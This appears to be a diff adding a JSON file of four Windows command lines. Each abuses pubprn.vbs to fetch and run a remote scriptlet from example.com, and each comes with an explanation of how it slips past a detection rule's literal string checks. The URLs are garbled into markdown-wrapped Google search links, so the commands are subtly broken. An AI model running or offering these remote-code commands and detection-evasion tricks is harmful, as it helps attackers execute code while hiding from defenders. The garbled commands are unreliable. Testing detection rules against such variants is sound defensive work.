@@ -1,0 +1,18 @@
+[
+{
+"output": "cscript.exe /b "C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs" localhost "sc""ript:[https://example.com/test.sct](https://www.google.com/search?q=https://example.com/test.sct)"",
+"explanation": "Insertion technique: Quoting the inner part of the payload argument as 'sc""ript:' breaks the literal 'script:' substring condition required by the rule. Windows argument parsers automatically strip these unquoted double-quotes before passing the string to pubprn.vbs, ensuring identical script processing during testing."
+},
+{
+"output": "cmd.exe /c cscript.exe /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs localhost s^cript:[https://example.com/test.sct](https://www.google.com/search?q=https://example.com/test.sct)",
+"explanation": "Insertion technique: Passing the command line through cmd.exe permits the insertion of the caret (^) escape character inside the parameter string ('s^cript:'). The command shell automatically normalizes and deletes this character prior to launching cscript, meaning the rule's 'script:' literal verification is circumvented while functionality remains unaltered."
+},
+{
+"output": "cscript.exe /b C:/Windows/System32/Printing_Admin_Scripts/en-US/pubprn.vbs localhost "script:[https://example.com/test.sct](https://www.google.com/search?q=https://example.com/test.sct)"",
+"explanation": "Substitution technique: Swapping out the standard Windows backslash delimiters ('\') in the file path with forward slashes ('/'). The Windows file subsystem accepts forward slashes natively, ensuring successful script loading, but this modification evades the strict literal '\pubprn.vbs' rule condition."
+},
+{
+"output": "cscript.exe /b C:\Windows\System32\Printing_Admin_Scripts\en-US\..\en-US\pubprn.vbs localhost "script:[https://example.com/test.sct](https://www.google.com/search?q=https://example.com/test.sct)"",
+"explanation": "Recoding technique: Utilizing standard path normalization techniques (specifically adding relative path traversal sequences like '\..\en-US\') manipulates the exact pattern of the command line string recorded in process execution logs. The operating system resolves this path back to the targeted file structure correctly, successfully bypassing the explicit '\pubprn.vbs' literal string check."
+}
+]
